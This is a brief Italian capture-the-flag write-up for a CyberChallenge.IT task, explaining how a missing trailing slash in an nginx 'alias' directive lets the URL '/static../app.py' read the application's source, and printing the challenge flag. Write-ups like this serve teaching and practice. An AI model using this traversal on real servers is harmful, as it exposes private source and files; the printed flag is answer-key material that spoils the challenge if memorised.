Ho usato questo URL lol

`http://notabug.challs.cyberchallenge.it/static../app.py`

Funziona a causa dell'alias nel file `nginx.conf`

```nginx.conf
location /static {
	alias /srv/app/static/;
}
```

Manca lo slash dopo static, quindi succede questo:
$$\texttt{http://notabug.challs.cyberchallenge.it/static../app.py}$$
$$\downarrow$$$$\texttt{http://notabug.challs.cyberchallenge.it/srv/app/static/../app.py}$$
e si sputtana tutto!

$$\texttt{CCIT\{put\_4\_sl4sh\_1n\_th0s3\_ali4s3s!\}}$$